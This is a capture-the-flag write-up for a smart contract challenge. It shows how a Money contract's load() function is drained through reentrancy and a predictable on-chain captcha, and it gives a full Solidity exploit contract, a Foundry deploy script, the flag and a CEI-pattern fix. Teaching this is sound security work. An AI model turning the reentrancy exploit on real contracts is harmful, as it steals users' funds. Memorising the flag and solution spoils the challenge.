# Writeup for Unsolveable Money Captcha

- Hello h4ck3r, welcome to the world of smart contract hacking. In order to understand this writeup you need to understand foundry.

### Challenge Description

Oh no! Hackerika just made a super-duper mysterious block chain thingy!
I'm not sure what she's up to, maybe creating a super cool bank app?
But guess what? It seems a bit wobbly because it's asking us to solve a super tricky captcha!
What a silly kid! Let's help her learn how to make a super-duper awesome contract with no head-scratching captcha! XD

### Exploit

Click [here](./src/contracts/) to view the source contracts.

In this challenge our task is make `isSolved()` function return true.

```solidity
function isSolved() public view returns (bool) {
    return address(moneyContract).balance == 0;
}
```

The isSolved() function returns true if the ETH balane of moneyContract is zero.

Now let's understand the `Money` contract.

The Money contract functions like a basic bank. people can save ETH in the contract and when they need it they can withdraw the ETH.

People can save the ETH by calling the save() function.

```
function save() public payable {
    require(msg.value > 0, "You don't have money XP");
    balances[msg.sender] += msg.value;
}
```

When someone calls this function by sending some ETH, it will update the balance of `msg.sender` (caller) by the amount of ETH sent.

Then later whenever the depositer want's to withdraw their saved ETH they can call the load() function.

```solidity
function load(uint256 userProvidedCaptcha) public {
    uint balance = balances[msg.sender];
    require(balance > 0, "You don't have money to load XD");

    uint256 generatedCaptcha = captchaContract.generateCaptcha(secret);
    require(userProvidedCaptcha == generatedCaptcha, "Invalid captcha");

    (bool success,) = msg.sender.call{value: balance}("");
    require(success, 'Oh my god, what is that!?');
    balances[msg.sender] = 0;
}
```

The function `load()` takes an argument of type `uint256` (userProvidedCaptcha). It fetches the ETH deposited by the `msg.sender`. If the deposited ETH is less than zero, the function call will revert. Otherwise, it generates a captcha by calling `generateCaptcha()` in the Captcha contract, passing `secret` as an argument. It then compares the generated value with the user-provided captcha. If both match, it transfers the deposited ETH back to the user. After the transfer, it checks if the transfer was successful. If successful, it updates the balance of `msg.sender` (caller) to zero.

The key point to observe here is that when the captcha matches, the function first sends the ETH and then updates the balance. This can lead to a reentrancy exploit. If the receiver is a smart contract, when `load()` transfers ETH, it will make a low-level call. If the contract has a `receive()` function, from within the `receive()` function, we can call the `load()` function again because our balance is still not updated.

Now let's look how captcha is generated.

```solidity
function generateCaptcha(uint256 _secret) external returns (uint256) {
    uint256 captcha = uint256(keccak256(abi.encodePacked(_secret, block.number, block.timestamp)));
    emit CaptchaGenerated(captcha);
    return captcha;
}
```

The function `generateCaptcha()` will take an argument of type `uint256` (\_secret) as input. It generates a captcha by hashing the combined text of `_secret`, block number, and block timestamp, and it will return the generated captcha.Since it is a external contract we can also directly call this function to generate captcha.

During deployment, the Setup contract deposits 10 ether into the Money contract, giving the Money contract a balance of 10 ether. If we deposit 10 ether into the Money contract and then call the `load()` function, it will trigger the `receive()` function in our Exploit contract. In the `receive` function, if we include logic to call the `load()` function again, the remaining 10 ether in the contract will also be transferred to us. The balance will be updated only after the `receive()` function finishes calling `load()` repeatedly.

Since the balance is updated to zero after every call, it doesn't matter how many times we call `load()` as long as the contract's balance is drained. If our logic in the `receive()` function calls the `load()` function repeatedly, even after the contract balance is drained, all the low-level calls will return false, and the `load()` function will revert with the message `Oh my god, what is that!?`.

The below is the exploit contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Setup, Money, Captcha} from "src/contracts/Setup.sol";

contract ExploitMoney {
    Setup public setup;
    Money public money;
    Captcha public captcha;
    uint256 num = 0;

    constructor() payable {
        require(msg.value == 10 ether);
        setup = Setup(address(this));
        money = Money(setup.moneyContract());
        captcha = Captcha(setup.captchaContract());
    }

    function Exploit() public {
        money.save{value: 10 ether}();
        uint256 secret = money.secret();
        uint256 gen_captcha = captcha.generateCaptcha(secret);
        money.load(gen_captcha);
    }

    receive() external payable {
        if (num == 0) {
            num++;
            uint256 secret = money.secret();
            uint256 gen_captcha = captcha.generateCaptcha(secret);
            money.load(gen_captcha);
        }
    }
}

```

Below is the exploit script to deploy `ExploitMoney` and call the `Exploit()` function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {ExploitMoney} from "./ExploitMoney.sol";

contract ExploitMoneyScript is Script {
    function run() public {
        vm.startBroadcast();
        ExploitMoney exploitmoney = new ExploitMoney{value: 10 ether}();
        exploitmoney.Exploit();
        vm.stopBroadcast();
    }
}

```

```shell
$ forge script script/ExplotMoneyScript.s.sol:ExploitMoneyScript --rpc-url $RPC_URL --interactive --broadcast
```

Once you run this script the challenge will be solved.

**Flag:** `TCP1P{retrancy_attack_plus_not_so_random_captcha}`

### Key Takeaways

Whenever our contract is making an external call to other contracts, we need to follow the CEI (Checks, Effects, Interactions) pattern to prevent any possibility of reentrancy. The below is the CEI pattern of load() function which will prevent the re-entrancy

```solidity
    function load(uint256 userProvidedCaptcha) public {

        uint balance = balances[msg.sender];
        require(balance > 0, "You don't have money to load XD");//Checks

        uint256 generatedCaptcha = captchaContract.generateCaptcha(secret);
        require(userProvidedCaptcha == generatedCaptcha, "Invalid captcha");//Checks
        balances[msg.sender] = 0; //Effects
        (bool success,) = msg.sender.call{value: balance}("");//Interactions
        require(success, 'Oh my god, what is that!?');

    }
```
